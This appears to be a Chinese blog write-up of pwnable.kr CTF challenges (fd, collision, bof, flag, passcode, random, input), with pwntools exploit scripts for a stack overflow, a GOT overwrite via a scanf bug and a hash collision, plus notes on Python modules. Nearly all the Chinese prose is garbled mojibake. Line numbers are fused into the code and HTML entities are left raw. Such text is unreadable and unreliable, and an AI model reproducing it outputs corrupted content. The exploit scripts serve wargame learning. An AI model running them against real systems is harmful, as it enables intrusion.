æ–‡ä»¶æè¿°ç¬¦åœ¨å½¢å¼ä¸Šæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚å®é™…ä¸Šï¼Œå®ƒæ˜¯ä¸€ä¸ªç´¢å¼•å€¼ï¼ŒæŒ‡å‘å†…æ ¸ä¸ºæ¯ä¸€ä¸ªè¿›ç¨‹æ‰€ç»´æŠ¤çš„è¯¥è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„è®°å½•è¡¨ã€‚å½“ç¨‹åºæ‰“å¼€ä¸€ä¸ªç°æœ‰æ–‡ä»¶æˆ–è€…åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶æ—¶ï¼Œå†…æ ¸å‘è¿›ç¨‹è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚ Linux shellåˆ›å»ºçš„æ¯ä¸ªè¿›ç¨‹å¼€å§‹æ—¶éƒ½æœ‰ä¸‰ä¸ªæ‰“å¼€çš„æ–‡ä»¶ï¼š 12345stdin æ ‡å‡†è¾“å…¥çš„æ–‡ä»¶æ ‡è¯†ç¬¦ä¸º0 stdout æ ‡å‡†è¾“å‡ºçš„æ–‡ä»¶æ ‡è¯†ç¬¦ä¸º1stderr æ ‡å‡†é”™è¯¯è¾“å‡ºçš„æ–‡ä»¶æ ‡è¯†ç¬¦ä¸º2 Exp: 1234567891011#coding=utf-8from pwn import *payload=str(0x1234)shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;fd&#x27;,password=&#x27;guest&#x27;,port=2222)#shell.download_file(&#x27;fd.c&#x27;)sh = shell.run(&#x27;./fd&#x27;+&#x27; &#x27;+payload)payload=&quot;LETMEWIN&quot;sh.sendline(payload)sh.interactive() collisionTips: è·Ÿå“ˆå¸Œç›¸å…³ä¸å¤§ï¼ˆÃ— å¯èƒ½æ˜¯æˆ‘æ²¡æœ‰getåˆ°å‡ºé¢˜äººçš„æ„æ€ æ€è·¯å¾ˆç®€å•ï¼Œç”¨hashcodeçš„å€¼é™¤ä»¥5ï¼Œå†ä¾æ¬¡åŠ èµ·æ¥å°±å¥½äº†ã€‚0x21DD09ECçš„åè¿›åˆ¶è¡¨ç¤ºæ˜¯568134124ï¼Œå®ƒå¹¶ä¸èƒ½è¢«5æ•´é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨ä¸€ä¸ªå°æŠ€å·§ï¼Œå…ˆåŠ 1ï¼Œå†é™¤ä»¥5ï¼Œæœ€åå°†å…¶ä¸­ä¸€ä¸ªæ•°å€¼å†å‡1å³å¯ã€‚ å…·ä½“è®¡ç®—æ–¹æ³•ä¸ºï¼š 12(568134124 + 1) / 5 = 113626825 = 0x6C5CEC90x21DD09EC = 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC9 + 0x6C5CEC8 é‚£ä¹ˆargv[1]çš„å­—ç¬¦ä¸²ï¼Œå°±åº”è¯¥æ˜¯ä¸€ä¸ªç”±ç›¸åº”åå…­è¿›åˆ¶æ•°å€¼ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œè¡¨ç¤ºå¦‚ä¸‹ï¼š 1\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc9\\xce\\xc5\\x06\\xc8\\xce\\xc5\\x06 è¿™é‡Œé‡‡ç”¨å°ç«¯å­˜å‚¨æ–¹å¼ã€‚ å°ç«¯å­˜å‚¨ï¼šé«˜å­—èŠ‚ä¿å­˜åœ¨å†…å­˜é«˜åœ°å€ï¼Œä½å­—èŠ‚ä¿å­˜åœ¨å†…å­˜ä½åœ°å€ä¸­ è¿™ä¸ªè§£é‡Šä¾æ—§ååˆ†ç¬¼ç»Ÿï¼Œä¸ºä»€ä¹ˆintå‹æ•°æ®ä»¥å°ç«¯å­˜å‚¨å°±è¦æ¯ä¸ªintå‹æ•°æ®é€†åºè¾“å…¥ ä¸‹é¢ä¸¤å¼ å›¾è¯´æ˜é—®é¢˜ï¼šï¼ˆÃ—å…¶å®è¿˜å¹¶ä¸èƒ½è¯´æ˜é—®é¢˜ ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¾“å…¥çš„å‘½ä»¤è¡Œå‚æ•°åœ¨å†…å­˜å­˜å‚¨çš„å¢é•¿æ–¹å‘ğŸ˜€ å„ç§Googleå‡æ— æœã€‚ã€‚æ— å¥ˆä¸‹æ‰‹åŠ¨æµ‹è¯•ä¸€ä¸‹ã€‚ Test Code: 12345678910 #include&lt;stdio.h&gt; int main(int argc,char* argv[],char* env[]) &#123;for(int i=0;i&lt;=2;i++) printf(&quot;argv[%d]:%p\\n&quot;,i,argv[i]); int i=0; printf(&quot;stack:%p\\n&quot;,&amp;i); printf(&quot;env:%p\\n&quot;,env[i]); return 0; &#125; å®è·µå‡ºçœŸçŸ¥: è¾“å…¥çš„argv[1]å­˜å‚¨åœ¨æ ˆä¸Šå’Œå†…æ ¸ç©ºé—´ä¹‹é—´ï¼Œå¹¶ä¸”ç”±ä½åœ°å€å‘é«˜åœ°å€å¢é•¿ã€‚ é‚£ä¹ˆå°±å¾ˆå®¹æ˜“æ˜ç™½ä¸ºä»€ä¹ˆé€†åºè¾“å…¥intå››ä¸ªå­—èŠ‚äº†ã€‚ ä»¥ä¸º0x6C5CEC9å’Œ0x6C5CEC8ä¸ºä¾‹ æˆ‘ä»¬ä¼ å…¥å‘½ä»¤è¡Œå‚æ•°argv[1]å¯¹åº”çš„å­—èŠ‚åºåˆ—ä¸º \\xc9\\xce\\xc5\\x06\\x12\\x34\\x56\\x78å®é™…å­˜å‚¨æ—¶å¦‚ä¸‹æ–¹å¼å­˜å‚¨å¦‚ä¸‹ï¼š é«˜åœ°å€8 78é«˜åœ°å€7 56é«˜åœ°å€6 34é«˜åœ°å€5 12é«˜åœ°å€4 06é«˜åœ°å€3 c5é«˜åœ°å€2 ceé«˜åœ°å€1 c9 intå‹å·æŒ‡é’ˆipæŒ‡å‘é«˜åœ°å€1 é‚£ä¹ˆç”±äºintå‹å·ä¸ºå°ç«¯å­˜å‚¨ï¼Œå››ä¸ªå­—èŠ‚ä¾æ¬¡è¯»å– ip[i]=0x06C5CEC9 ip[2]=0x78563412 ç½‘ä¸Šå¤§éƒ¨åˆ†è§£æåªæ˜¯ç®€å•è¯´æ˜intæ•°æ®å°ç«¯å­˜å‚¨ï¼Œä½†æ˜¯å•å•çŸ¥é“è¿™ä¸ªæ˜¯ä¸è¶³ä»¥å¾—å‡ºé€†åºè¾“å…¥çš„ç»“è®ºï¼Œå¿…é¡»çŸ¥é“å‘½ä»¤è¡Œå‚æ•°å­˜å‚¨ç»“æ„ã€‚ ä»¥ä¸Šå†…å®¹åŸåˆ›ã€‚è½¬è½½æ³¨æ˜å‡ºå¤„ã€‚ PSï¼šéƒ¨åˆ†å­—èŠ‚æ²¡æœ‰å¯¹åº”ASCIIç ï¼Œæˆ‘ä»¬éœ€è¦ç›´æ¥å‘argv[1]ä¸­å†™å…¥å­—èŠ‚ï¼Œå¯ä»¥ç”¨pythonå®ç° Demo: 1`python -c print &#x27;\\xAB\\xCD&#x27;` Exp: 12345678#coding=utf-8from pwn import *payload=p32(0x6c5cec9)*4+p32(0x6c5cec8)shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;col&#x27;,password=&#x27;guest&#x27;,port=2222)sh = shell.run(&#x27;./col&#x27;+&#x27; &#x27;+payload)sh.interactive() bofAnalyse: getç®€å•çš„æº¢å‡º IDAé™æ€æŸ¥çœ‹arg[1]å’Œæ•°ç»„keyå¯¹åº”çš„VAåœ°å€ï¼Œè®¡ç®—å‡ºåç§»ä¸º0x52 Exp: 1234567#coding=utf-8from pwn import *io=remote(&quot;pwnable.kr&quot;,9000)payload=&#x27;a&#x27;*(0x2c+0x8)+p32(0xcafebabe)io.sendline(payload)io.interactive() flagAnalyse: IDAé™æ€åˆ†æå‘ç°é‡Œé¢å†…å®¹å°‘å¾—å¯æ€œ..å¾ˆæ˜æ˜¾æ˜¯åŠ å£³äº† è¿™é‡Œéœ€è¦ç”¨åˆ°stringså‘½ä»¤ï¼Œä¸€ä¸ªæŠ€å·§å¯ä»¥è·å¾—å…³é”®çš„ä¿¡æ¯ï¼š 1strings -20 flag æ˜¾ç¤ºflagæ–‡ä»¶ä¸­è‡³å°‘åŒ…å«20ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå®šä½å…³é”®ä¿¡æ¯ï¼š 1Info: This file is packed with the UPX executable packer http:&#x2F;&#x2F;upx.sf.net Googleåç®€å•äº†è§£äº†ä¸€ä¸‹upx ï¼Œæ˜¯ä¸ªå‹ç¼©å£³ upx -d è§£å‹ä¸€ä¸‹å³å¯ ç„¶åå­—ç¬¦æœç´¢å…³é”®è¯å­— :) #æ³¨æ„æ­¤å¤„éœ€è¦è½¬ä¹‰å­—ç¬¦ 1strings flag |grep \\:\\) passcodesouce code: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123;//è¿™ä¸ªæ¡ä»¶ä¸€æ—¦æˆç«‹å°±å¯ä»¥pwn printf(&quot;Login OK!\\n&quot;); system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;Login Failed!\\n&quot;); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\\n&quot;, name);&#125;int main()&#123; printf(&quot;Toddler&#x27;s Secure Login System 1.0 beta.\\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\\n&quot;); return 0;&#125; key points: scanfå‡½æ•°: scanf(&quot;%d&quot;, passcode1); ç¼ºå°‘ä¸€ä¸ª&amp;è¿™æ—¶å‡½æ•°æ‰§è¡Œæ—¶ï¼Œä¼šå°†passcode1ä½œä¸ºåœ°å€è¿›è¡Œå†™å…¥æ“ä½œï¼ŒåŒç†å¯¹åº”passcode2ä¸€æ ·ã€‚ä¸€æ—¦è¿™ä¸¤ä¸ªä¸å¯æ§çš„åœ°å€æ˜¯ä¸å¯å†™æˆ–è®¿é—®çš„ï¼Œé‚£ä¹ˆç¨‹åºå°±crashäº†ã€‚ é‚£ä¹ˆå¯¹passcode1å’Œ2åœ°å€çš„æ„é€ ï¼Œç„¶ååˆ©ç”¨scanfå‡½æ•°åœ¨è¯¥åœ°å€è¿›è¡Œå†™å…¥æ•°æ®ä¼šæ˜¯å…³é”®ã€‚ Analyseï¼š å‡½æ•°æµç¨‹åˆ†æ welcome:å¯ä»¥åœ¨nameæ•°ç»„ä¸­å†™å…¥é•¿åº¦ä½100å­—èŠ‚çš„å­—ç¬¦ æ¥ä¸‹æ¥æ— ç¼æ‰§è¡Œ loginï¼š å¯¹passcode1åœ°å€ä¸Šè¿›è¡Œå†™å…¥æ•°æ® â¡ è°ƒç”¨fflush(stdin); â¡ è¾“å…¥passcode2 â¡checkä¸ºçœŸåè¾“å‡ºflag ç”±äºwelcome()å’Œlogin()è¿™ä¸¤ä¸ªå‡½æ•°ä¹‹é—´æ‰§è¡ŒæœŸé—´æ²¡æœ‰å…¶ä»–æ“ä½œï¼Œå¯ä»¥åˆ†æå¾—å‡ºå‰åè¿›å…¥è¿™ä¸¤ä¸ªæ ˆå¸§æ—¶ï¼Œä»–ä»¬çš„EBPæ˜¯ä¸€æ ·çš„ï¼Œè‡ªç„¶å¯ä»¥æƒ³åˆ°æˆ‘ä»¬å¯ä»¥é¢†ç”¨nameæ•°ç»„å¯¹passcode1å’Œpasscode2è¿›è¡Œè¦†ç›–ã€‚ IDAé™æ€åˆ†æï¼š nameæ•°ç»„æ•°ç»„çš„åœ°å€ä¸ºï¼šEBP-70H passcode1åœ°å€: EBP-10H passcode2åœ°å€: EBP-0cH welcomeï¼ˆï¼‰å’Œloginï¼ˆï¼‰è¿™ä¸¤ä¸ªå‡½æ•°æ ˆå¸§çš„EBPä¸€æ ·åªæ˜¯æˆ‘ä»¬çš„çŒœæµ‹ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨gdbåŠ¨æ€è°ƒè¯•éªŒè¯æŸ¥çœ‹æ˜¯å¦ç¡®å®ç›¸åŒã€‚ ä¸‹è½½ELFæ–‡ä»¶ï¼š 1234#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;passcode&#x27;,password=&#x27;guest&#x27;,port=2222)shell.download_file(&quot;./passcode&quot;) ä¿®æ”¹æƒé™ 1chmod 777 passcode æŸ¥çœ‹å†…å­˜ä¿æŠ¤ä¿¡æ¯ï¼š 1checksec passcode æ­¤å¤„çš„RELROä¿¡æ¯ä¸ºå…³é”®ç‚¹ï¼Œå…³äºchecksec æŸ¥çœ‹å†…å­˜ä¿æŠ¤ä¿¡æ¯å‚é˜…è¿™ç¯‡ï¼š linuxå†…å­˜ä¿æŠ¤ä¿¡æ¯ gdbåŠ¨æ€è°ƒè¯•ï¼š æŸ¥çœ‹éªŒè¯ï¼šç¡®å®ä¸¤ä¸ªå‡½æ•°æ ˆå¸§çš„EBPç›¸åŒï¼Œé‚£ä¹ˆè‡ªç„¶æƒ³åˆ°å¯ä»¥åˆ©ç”¨nameæ•°ç»„å¯¹passcode1å’Œ2è¿›è¡Œè¦†ç›–ï¼Œä½†æ˜¯æ³¨æ„åˆ°æ•°ç»„nameå¤§å°æ˜¯100å­—èŠ‚ï¼Œnameé¦–åœ°å€åˆ°passcode1é¦–åœ°å€è·ç¦»ä¸º96ï¼Œæˆ‘ä»¬ç»„å¤šèƒ½åˆ©ç”¨nameæ•°ç»„çš„æœ€åå››ä¸ªå­—èŠ‚è¦†ç›–passcode1ï¼Œæ— æ³•è¦†ç›–åˆ°passcode2 æ³¨æ„åˆ°è¾“å…¥passcode1åï¼Œç«‹å³æ‰§è¡Œäº† fflush(stdin) ã€ç”¨äºæ›´æ–°ç¼“å†²åŒºã€‘å‡½æ•°ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ—¶å€™ä¼šåˆ©ç”¨linuxçš„åŠ¨æ€å»¶è¿ŸåŠ è½½ã€‚ æ­¤å¤„éœ€è¦æ¶è¡¥ä¸€ä¸‹GOTå’ŒPLTè¡¨çš„å…³ç³»ä»¥åŠlinuxåŠ¨æ€å»¶è¿ŸåŠ è½½çš„ä¸€äº›åªæ˜¯ï¼š å‚è€ƒè¿™ç¯‡éå¸¸è¯¦ç»† å‚é˜…å®Œæ¯•åå°±å¯ä»¥è¿›è¡Œexp Hijack GOTï¼š ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œè®©å…¶æŒ‡å‘å¦ä¸€ä¸ªå‡½æ•° è¿™é‡Œæˆ‘ä»¬ä¿®æ”¹è°ƒç”¨fflushçš„åœ°å€ï¼Œæ”¹ä¸ºcat flagæŒ‡ä»¤çš„åœ°å€ï¼Œç„¶åæˆåŠŸæ‰§è¡Œcat flagæŒ‡ä»¤å¾—åˆ°flagã€‚ æœ€åè¦åšçš„å°±æ˜¯æ‰¾åˆ°è°ƒç”¨fflushçš„åœ°å€å’Œcat flagçš„åœ°å€ï¼Œç„¶åç”¨nameæ•°ç»„å¯¹passcode1è¦†ç›–ä¸ºfflushçš„GOTè¡¨é¡¹åœ°å€ï¼Œç„¶åç”¨scanfå‡½æ•°å¯¹GOTè¡¨è±¡è¦†å†™ä¸ºè¾“å‡ºflagçš„æŒ‡ä»¤å³å¯ã€‚ æ‰¾åˆ°fflushçš„GOTè¡¨é¡¹åœ°å€: 0x0804a004 æ‰¾åˆ°cat flag æŒ‡ä»¤åœ°å€ä¸ºï¼š0x080485E3 Expï¼š 1234567891011#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;passcode&#x27;,password=&#x27;guest&#x27;,port=2222)sysh_addr=0x080485E3fflush_got=0x0804a004payload=&quot;a&quot;*(100-4)+p32(fflush_got)sh=shell.run(&#x27;./passcode&#x27;)sh.sendlineafter(&quot;enter you name :&quot;,payload)payload=str(sysh_addr)sh.sendlineafter(&quot;enter passcode1 :&quot;,payload)sh.interactive() randomä¸€ä¸ªCè¯­è¨€çš„çŸ¥è¯†ç‚¹ï¼šå¦‚æœç”¨æˆ·åœ¨rand()ä¹‹å‰æ²¡æœ‰è°ƒç”¨è¿‡sand(),é‚£ä¹ˆç³»ç»Ÿé»˜è®¤å°†1ä½œä¸ºä¼ªéšæœºæ•°çš„åˆå§‹å€¼ï¼Œå¦‚æœç»™å®šäº†ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆæ¯æ¬¡rand()äº§ç”Ÿçš„éšæœºæ•°åºåˆ—éƒ½æ˜¯ä¸€æ ·çš„ã€‚ EXP 12345678#coding=utf-8from pwn import *shell=ssh(host=&#x27;pwnable.kr&#x27;,user=&#x27;random&#x27;,password=&#x27;guest&#x27;,port=2222)payload=str(3039230856)sh=shell.run(&#x27;./random&#x27;)sh.sendline(payload)sh.interactive() inputä¸»è¦è€ƒå¯Ÿlinuxçš„ä¸€äº›åŸºæœ¬å‚æ•°ä¼ é€’ï¼Œè¿™é‡Œå°±å½“åšå­¦ä¹ pythonçš„ä¸€äº›æ¨¡å—ã€‚ã€‚ subprocessæ¨¡å— Demo: 1subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, capture_output=False, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None, text=None, env=None, universal_newlines=None) argsï¼šè¡¨ç¤ºè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚å¿…é¡»æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²å‚æ•°åˆ—è¡¨ã€‚ stdinã€stdout å’Œ stderrï¼šå­è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯ã€‚å…¶å€¼å¯ä»¥æ˜¯ subprocess.PIPEã€subprocess.DEVNULLã€ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶æè¿°ç¬¦ã€å·²ç»æ‰“å¼€çš„æ–‡ä»¶å¯¹è±¡æˆ–è€… Noneã€‚subprocess.PIPE è¡¨ç¤ºä¸ºå­è¿›ç¨‹åˆ›å»ºæ–°çš„ç®¡é“ã€‚subprocess.DEVNULL è¡¨ç¤ºä½¿ç”¨ os.devnullã€‚é»˜è®¤ä½¿ç”¨çš„æ˜¯ Noneï¼Œè¡¨ç¤ºä»€ä¹ˆéƒ½ä¸åšã€‚å¦å¤–ï¼Œstderr å¯ä»¥åˆå¹¶åˆ° stdout é‡Œä¸€èµ·è¾“å‡ºã€‚ timeoutï¼šè®¾ç½®å‘½ä»¤è¶…æ—¶æ—¶é—´ã€‚å¦‚æœå‘½ä»¤æ‰§è¡Œæ—¶é—´è¶…æ—¶ï¼Œå­è¿›ç¨‹å°†è¢«æ€æ­»ï¼Œå¹¶å¼¹å‡º TimeoutExpired å¼‚å¸¸ã€‚ checkï¼šå¦‚æœè¯¥å‚æ•°è®¾ç½®ä¸º Trueï¼Œå¹¶ä¸”è¿›ç¨‹é€€å‡ºçŠ¶æ€ç ä¸æ˜¯ 0ï¼Œåˆ™å¼¹ å‡º CalledProcessError å¼‚å¸¸ã€‚ encoding: å¦‚æœæŒ‡å®šäº†è¯¥å‚æ•°ï¼Œåˆ™ stdinã€stdout å’Œ stderr å¯ä»¥æ¥æ”¶å­—ç¬¦ä¸²æ•°æ®ï¼Œå¹¶ä»¥è¯¥ç¼–ç æ–¹å¼ç¼–ç ã€‚å¦åˆ™åªæ¥æ”¶ bytes ç±»å‹çš„æ•°æ®ã€‚ shellï¼šå¦‚æœè¯¥å‚æ•°ä¸º Trueï¼Œå°†é€šè¿‡æ“ä½œç³»ç»Ÿçš„ shell æ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚ osæ¨¡å— è¯¥æ¨¡å—æä¾›äº†ä¸€äº›æ–¹ä¾¿ä½¿ç”¨æ“ä½œç³»ç»Ÿç›¸å…³åŠŸèƒ½çš„å‡½æ•°ã€‚ fdopen()å‡½æ•°ï¼šåˆ›å»ºæ–‡ä»¶å¯¹è±¡ os.fdopen(fd, **args,\\kwargs):è¿”å›æ‰“å¼€æ–‡ä»¶æè¿°ç¬¦ fd å¯¹åº”æ–‡ä»¶çš„å¯¹è±¡ã€‚ç±»ä¼¼å†…å»º open() å‡½æ•°ï¼ŒäºŒè€…æ¥å—åŒæ ·çš„å‚æ•°ã€‚ä¸åŒä¹‹å¤„åœ¨äº fdopen() ç¬¬ä¸€ä¸ªå‚æ•°åº”è¯¥ä¸ºæ•´æ•°ã€‚ open()å‡½æ•°ï¼š æ‰“å¼€æ–‡ä»¶å¯¹è±¡ file æ˜¯ä¸€ä¸ª path-like objectï¼Œè¡¨ç¤ºå°†è¦æ‰“å¼€çš„æ–‡ä»¶çš„è·¯å¾„ï¼ˆç»å¯¹è·¯å¾„æˆ–è€…å½“å‰å·¥ä½œç›®å½•çš„ç›¸å¯¹è·¯å¾„ï¼‰ï¼Œä¹Ÿå¯ä»¥æ˜¯è¦è¢«å°è£…çš„æ•´æ•°ç±»å‹æ–‡ä»¶æè¿°ç¬¦ã€‚ï¼ˆå¦‚æœæ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œå®ƒä¼šéšç€è¿”å›çš„ I/O å¯¹è±¡å…³é—­è€Œå…³é—­ï¼Œé™¤é closefd è¢«è®¾ä¸º False ã€‚ï¼‰ open(file, mode=â€™râ€™, buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None) mode æ˜¯ä¸€ä¸ªå¯é€‰å­—ç¬¦ä¸²ï¼Œç”¨äºæŒ‡å®šæ‰“å¼€æ–‡ä»¶çš„æ¨¡å¼ã€‚é»˜è®¤å€¼æ˜¯ &#39;r&#39; ï¼Œè¿™æ„å‘³ç€å®ƒä»¥æ–‡æœ¬æ¨¡å¼æ‰“å¼€å¹¶è¯»å–ã€‚å…¶ä»–å¸¸è§æ¨¡å¼æœ‰ï¼šå†™å…¥ &#39;w&#39; ï¼ˆæˆªæ–­å·²ç»å­˜åœ¨çš„æ–‡ä»¶ï¼‰ï¼›æ’å®ƒæ€§åˆ›å»º &#39;x&#39; ï¼›è¿½åŠ å†™ &#39;a&#39; ï¼ˆåœ¨ ä¸€äº› Unix ç³»ç»Ÿä¸Šï¼Œæ— è®ºå½“å‰çš„æ–‡ä»¶æŒ‡é’ˆåœ¨ä»€ä¹ˆä½ç½®ï¼Œæ‰€æœ‰ å†™å…¥éƒ½ä¼šè¿½åŠ åˆ°æ–‡ä»¶æœ«å°¾ï¼‰ã€‚åœ¨æ–‡æœ¬æ¨¡å¼ï¼Œå¦‚æœ encoding æ²¡æœ‰æŒ‡å®šï¼Œåˆ™æ ¹æ®å¹³å°æ¥å†³å®šä½¿ç”¨çš„ç¼–ç ï¼šä½¿ç”¨ locale.getpreferredencoding(False) æ¥è·å–æœ¬åœ°ç¼–ç ã€‚ï¼ˆè¦è¯»å–å’Œå†™å…¥åŸå§‹å­—èŠ‚ï¼Œè¯·ä½¿ç”¨äºŒè¿›åˆ¶æ¨¡å¼å¹¶ä¸è¦æŒ‡å®š encodingã€‚ï¼‰å¯ç”¨çš„æ¨¡å¼æœ‰ï¼š å­—ç¬¦ å«ä¹‰ &#39;r&#39; è¯»å–ï¼ˆé»˜è®¤ï¼‰ &#39;w&#39; å†™å…¥ï¼Œå¹¶å…ˆæˆªæ–­æ–‡ä»¶ &#39;x&#39; æ’å®ƒæ€§åˆ›å»ºï¼Œå¦‚æœæ–‡ä»¶å·²å­˜åœ¨åˆ™å¤±è´¥ &#39;a&#39; å†™å…¥ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨åˆ™åœ¨æœ«å°¾è¿½åŠ  &#39;b&#39; äºŒè¿›åˆ¶æ¨¡å¼ &#39;t&#39; æ–‡æœ¬æ¨¡å¼ï¼ˆé»˜è®¤ï¼‰ &#39;+&#39; æ›´æ–°ç£ç›˜æ–‡ä»¶ï¼ˆè¯»å–å¹¶å†™å…¥ï¼‰ é»˜è®¤çš„æ¨¡å¼æ˜¯ &#39;r&#39; ï¼ˆæ‰“å¼€å¹¶è¯»å–æ–‡æœ¬ï¼ŒåŒ &#39;rt&#39; ï¼‰ã€‚å¯¹äºäºŒè¿›åˆ¶å†™å…¥ï¼Œ &#39;w+b&#39; æ¨¡å¼æ‰“å¼€å¹¶æŠŠæ–‡ä»¶æˆªæ–­æˆ 0 å­—èŠ‚ï¼› &#39;r+b&#39; åˆ™ä¸ä¼šæˆªæ–­ã€‚ os.pipe() åˆ›å»ºä¸€ä¸ªç®¡é“ï¼Œè¿”å›ä¸€å¯¹åˆ†åˆ«ç”¨äºè¯»å–å’Œå†™å…¥çš„æ–‡ä»¶æè¿°ç¬¦ (r, w)ã€‚ Demo: 123456789101112131415161718192021222324252627282930#!/usr/bin/python# -*- coding: UTF-8 -*-import os, sysprint &quot;The child will write text to a pipe and &quot;print &quot;the parent will read the text written by child...&quot;# file descriptors r, w for reading and writingr, w = os.pipe() processid = os.fork()if processid: # This is the parent process # Closes file descriptor w os.close(w) r = os.fdopen(r) print &quot;Parent reading&quot; str = r.read() print &quot;text =&quot;, str sys.exit(0)else: # This is the child process os.close(r) w = os.fdopen(w, &#x27;w&#x27;) print &quot;Child writing&quot; w.write(&quot;Text written by child...&quot;) w.close() print &quot;Child closing&quot; sys.exit(0) socketæ¨¡å— è¿™ä¸ªæ¨¡å—æä¾›äº†è®¿é—®BSDå¥—æ¥å­—çš„æ¥å£ã€‚åœ¨æ‰€æœ‰ç°ä»£Unixç³»ç»Ÿã€Windowsã€macOSå’Œå…¶ä»–ä¸€äº›å¹³å°ä¸Šå¯ç”¨ã€‚ è¿™ä¸ªPythonæ¥å£æ˜¯ç”¨Pythonçš„é¢å‘å¯¹è±¡é£æ ¼å¯¹Unixç³»ç»Ÿè°ƒç”¨å’Œå¥—æ¥å­—åº“æ¥å£çš„ç›´è¯‘ï¼šå‡½æ•°socket() è¿”å›ä¸€ä¸ª å¥—æ¥å­—å¯¹è±¡ ï¼Œå…¶æ–¹æ³•æ˜¯å¯¹å„ç§å¥—æ¥å­—ç³»ç»Ÿè°ƒç”¨çš„å®ç°ã€‚å½¢å‚ç±»å‹ä¸€èˆ¬ä¸Cæ¥å£ç›¸æ¯”æ›´é«˜çº§ï¼šä¾‹å¦‚åœ¨Pythonæ–‡ä»¶ read() å’Œ write() æ“ä½œä¸­ï¼Œæ¥æ”¶æ“ä½œçš„ç¼“å†²åŒºåˆ†é…æ˜¯è‡ªåŠ¨çš„ï¼Œå‘é€æ“ä½œçš„ç¼“å†²åŒºé•¿åº¦æ˜¯éšå¼çš„ã€‚ Demo: 1socket.socket(socket_family,socket_type,protocal=0) family: å¥—æ¥å­—å®¶æ—å¯ä»¥ä½¿ AF_UNIX æˆ–è€… AF_INETã€‚ type: å¥—æ¥å­—ç±»å‹å¯ä»¥æ ¹æ®æ˜¯é¢å‘è¿æ¥çš„è¿˜æ˜¯éè¿æ¥åˆ†ä¸º SOCK_STREAM æˆ– SOCK_DGRAMã€‚ protocol: ä¸€èˆ¬ä¸å¡«é»˜è®¤ä¸º 0ã€‚ socket_familyå‚æ•°ï¼š 1.åŸºäºæ–‡ä»¶ç±»å‹çš„å¥—æ¥å­—å®¶æ— å¥—æ¥å­—å®¶æ—çš„åå­—ï¼šAF_UNIXï¼Œunixä¸€åˆ‡çš†æ–‡ä»¶ï¼ŒåŸºäºæ–‡ä»¶çš„å¥—æ¥å­—è°ƒç”¨çš„å°±æ˜¯åº•å±‚çš„æ–‡ä»¶ç³»ç»Ÿæ¥å–æ•°æ®ï¼Œä¸¤ä¸ªå¥—æ¥å­—è¿›ç¨‹è¿è¡Œåœ¨åŒä¸€æœºå™¨ï¼Œå¯ä»¥é€šè¿‡è®¿é—®åŒä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿé—´æ¥å®Œæˆé€šä¿¡ã€‚ 2.åŸºäºç½‘ç»œç±»å‹çš„å¥—æ¥å­—å®¶æ— å¥—æ¥å­—å®¶æ—çš„åå­—ï¼šAF_INETï¼Œè¿˜æœ‰AF_INET6è¢«ç”¨äºipv6ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„åœ°å€å®¶æ—ï¼Œä¸è¿‡ï¼Œä»–ä»¬è¦ä¹ˆæ˜¯åªç”¨äºæŸä¸ªå¹³å°ï¼Œè¦ä¹ˆå°±æ˜¯å·²ç»è¢«åºŸå¼ƒï¼Œæˆ–è€…æ˜¯å¾ˆå°‘è¢«ä½¿ç”¨ï¼Œæˆ–è€…æ˜¯æ ¹æœ¬æ²¡æœ‰å®ç°ï¼Œæ‰€æœ‰åœ°å€å®¶æ—ä¸­ï¼ŒAF_INETæ˜¯ä½¿ç”¨æœ€å¹¿æ³›çš„ä¸€ä¸ªï¼Œpythonæ”¯æŒå¾ˆå¤šç§åœ°å€å®¶æ—ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬åªå…³å¿ƒç½‘ç»œç¼–ç¨‹ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†æ—¶å€™æˆ‘ä¹ˆåªä½¿ç”¨AF_INETã€‚ 